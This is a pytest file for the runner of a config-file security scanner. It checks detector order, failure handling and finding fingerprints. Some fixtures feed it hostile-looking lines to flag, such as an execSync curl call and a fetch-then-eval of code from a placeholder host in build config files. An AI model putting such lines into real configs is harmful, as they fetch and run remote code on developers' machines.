"""Runner tests (task 2.11): dispatch order, the engine pass and detector failures.

`airlock.runner.DETECTORS` is patched where a test needs a raising detector; the shipped
registry is checked separately in `test_cli.py`.
"""

from __future__ import annotations

from collections.abc import Iterable
from pathlib import Path
from typing import Any

import pytest

from airlock import roles, runner
from airlock.detectors import DETECTOR_NAMES
from airlock.fingerprint import PendingFinding
from airlock.model import FileEntry, Manifest, Policy, ScanContext, Severity
from airlock.rules import load_role_globs, load_rules

REPO_ROOT = Path(__file__).resolve().parents[2]


def make_rules(extra_body: str | None = None) -> tuple[Any, ...]:
    role_globs = load_role_globs(REPO_ROOT / "rules" / "roles.toml")
    rules = load_rules(
        REPO_ROOT / "rules" / "builtin",
        known_detectors=DETECTOR_NAMES,
        known_roles=sorted(roles.known_roles(role_globs)),
    )
    return rules


def make_entry(
    path: str,
    text: str | None,
    *,
    entry_roles: tuple[str, ...] | None = None,
    sha256: str | None = None,
) -> FileEntry:
    roles_ = (
        entry_roles
        if entry_roles is not None
        else (roles.TOOLING_CONFIG_ROLE, roles.SOURCE_ROLE)
        if text is not None
        else (roles.WASM_ROLE,)
    )
    digest = sha256 if sha256 is not None else ("a" * 64 if text is not None else None)
    skip_reason = None if digest is not None else "unreadable"
    return FileEntry(path=path, sha256=digest, roles=roles_, text=text, skip_reason=skip_reason)


def make_context(entries: list[FileEntry], **overrides: Any) -> ScanContext:
    values: dict[str, Any] = {
        "entries": tuple(entries),
        "policy": Policy(),
        "manifest": Manifest(),
        "rules": make_rules(),
    }
    values.update(overrides)
    return ScanContext(**values)


class Boom(Exception):
    pass


def raising_detector(ctx: ScanContext) -> Iterable[PendingFinding]:
    raise Boom("detector fell over")


def partial_detector(ctx: ScanContext) -> Iterable[PendingFinding]:
    """A generator that yields once and then raises, the shape a real detector has."""
    yield PendingFinding(
        rule_id="wasm-unlisted",
        severity=Severity.HIGH,
        path=ctx.entries[0].path,
        line=0,
        roles=ctx.entries[0].roles,
        message="yielded before the failure",
        evidence="payload",
        suppressible=False,
        file_sha256=None,
    )
    raise Boom("failed on the next file")


@pytest.fixture
def registry(monkeypatch: pytest.MonkeyPatch) -> Any:
    def apply(*detectors: Any) -> None:
        monkeypatch.setattr(runner, "DETECTORS", detectors)

    return apply


class TestEnginePass:
    def test_the_engine_pass_reaches_a_file_config_role_never_looks_at(self) -> None:
        # Capability rules name `tooling-config`, so config_role skips this file. The rule that
        # covers every text role is the cap account, and the engine runs it without any detector.
        entry = make_entry("src/a.py", "x" * 40 + "\n", entry_roles=(roles.SOURCE_ROLE,))
        context = make_context([entry], policy=Policy(line_cap=20))
        assert [item.rule_id for item in runner.engine_findings(context)] == ["cfg-long-line"]
        assert runner.collect(context)[0].rule_id == "cfg-long-line"

    def test_the_cap_account_runs_for_every_entry_with_text(self) -> None:
        entry = make_entry("docs/a.md", "x" * 50 + "\n", entry_roles=(roles.DOC_ROLE,))
        findings = list(runner.engine_findings(make_context([entry], policy=Policy(line_cap=20))))
        assert [item.rule_id for item in findings] == ["cfg-long-line"]
        assert findings[0].severity is Severity.WARN

    def test_an_entry_without_text_gets_no_engine_finding(self) -> None:
        binary = make_entry("artifact.wasm", None)
        assert runner.engine_findings(make_context([binary])) == ()

    def test_the_spawn_rule_is_not_run_twice(self) -> None:
        # The engine runs pattern rules; config_role owns the spawn tiers. One line, one finding.
        entry = make_entry("postcss.config.js", "execSync('curl http://example.invalid/x')\n")
        ids = [item.rule_id for item in runner.collect(make_context([entry]))]
        assert ids.count("cfg-process-spawn") == 1

    def test_a_capability_line_reports_the_rule_and_the_combination_once(self) -> None:
        entry = make_entry(
            "next.config.js",
            "const src = await fetch('http://example.invalid');\neval(src);\n",
        )
        ids = sorted(item.rule_id for item in runner.collect(make_context([entry])))
        assert ids == ["cfg-dynamic-code", "cfg-network", "cfg-network-exec"]


class TestDispatch:
    def test_detectors_run_in_registry_order(self, registry: Any) -> None:
        calls: list[str] = []

        def first(ctx: ScanContext) -> Iterable[PendingFinding]:
            calls.append("first")
            return ()

        def second(ctx: ScanContext) -> Iterable[PendingFinding]:
            calls.append("second")
            return ()

        registry(first, second)
        runner.collect(make_context([make_entry("a.md", "x\n", entry_roles=(roles.DOC_ROLE,))]))
        assert calls == ["first", "second"]

    def test_the_shipped_detectors_are_registered(self) -> None:
        assert len(runner.DETECTORS) == len(DETECTOR_NAMES) == 7

    def test_a_detector_that_raises_becomes_one_high_finding(self, registry: Any) -> None:
        registry(raising_detector)
        findings = runner.scan(make_context([make_entry("a.js", "x\n")]))
        errors = [f for f in findings if f.rule_id == "detector-error"]
        assert len(errors) == 1
        assert errors[0].severity is Severity.HIGH
        assert not errors[0].suppressible
        assert errors[0].path == "."
        # The exception text is evidence now, so scanned content cannot enter the message.
        assert "Boom" in errors[0].message
        assert "detector fell over" not in errors[0].message
        assert errors[0].evidence is not None
        assert "detector fell over" in errors[0].evidence

    def test_a_generator_that_fails_part_way_still_yields_what_it_found(
        self, registry: Any
    ) -> None:
        registry(partial_detector)
        findings = runner.scan(make_context([make_entry("a.wasm", None)]))
        assert "wasm-unlisted" in [f.rule_id for f in findings]
        assert "detector-error" in [f.rule_id for f in findings]

    def test_a_failing_detector_does_not_stop_the_next_one(self, registry: Any) -> None:
        registry(raising_detector, partial_detector)
        findings = runner.scan(make_context([make_entry("a.wasm", None)]))
        assert [f.rule_id for f in findings].count("detector-error") == 2
        assert "wasm-unlisted" in [f.rule_id for f in findings]

    def test_the_engine_pass_still_runs_when_a_detector_raises(self, registry: Any) -> None:
        registry(raising_detector)
        entry = make_entry("postcss.config.js", "eval(payload)\n")
        ids = [f.rule_id for f in runner.scan(make_context([entry]))]
        assert "cfg-dynamic-code" in ids
        assert "detector-error" in ids


class TestReportShape:
    def test_findings_come_back_high_first(self) -> None:
        entry = make_entry("postcss.config.js", "const a = 'http://example.invalid';\n")
        findings = runner.scan(make_context([entry]))
        severities = [f.severity for f in findings]
        assert severities == sorted(severities, key=lambda s: -int(s))

    def test_the_same_tree_produces_the_same_fingerprints(self) -> None:
        entries = [
            make_entry("a.config.js", "eval(x)\neval(x)\n"),
            make_entry("b.config.js", "const y = 'http://example.invalid';\n"),
        ]
        first = [f.fingerprint for f in runner.scan(make_context(entries))]
        second = [f.fingerprint for f in runner.scan(make_context(entries))]
        assert first == second
        assert len(set(first)) == len(first)

    def test_a_duplicate_line_gets_its_own_occurrence(self) -> None:
        entry = make_entry("a.config.js", "eval(x)\neval(x)\n")
        findings = [
            f for f in runner.scan(make_context([entry])) if f.rule_id == "cfg-dynamic-code"
        ]
        assert [f.occurrence for f in findings] == [0, 1]

    def test_an_empty_scan_produces_no_findings(self) -> None:
        assert runner.scan(make_context([])) == []
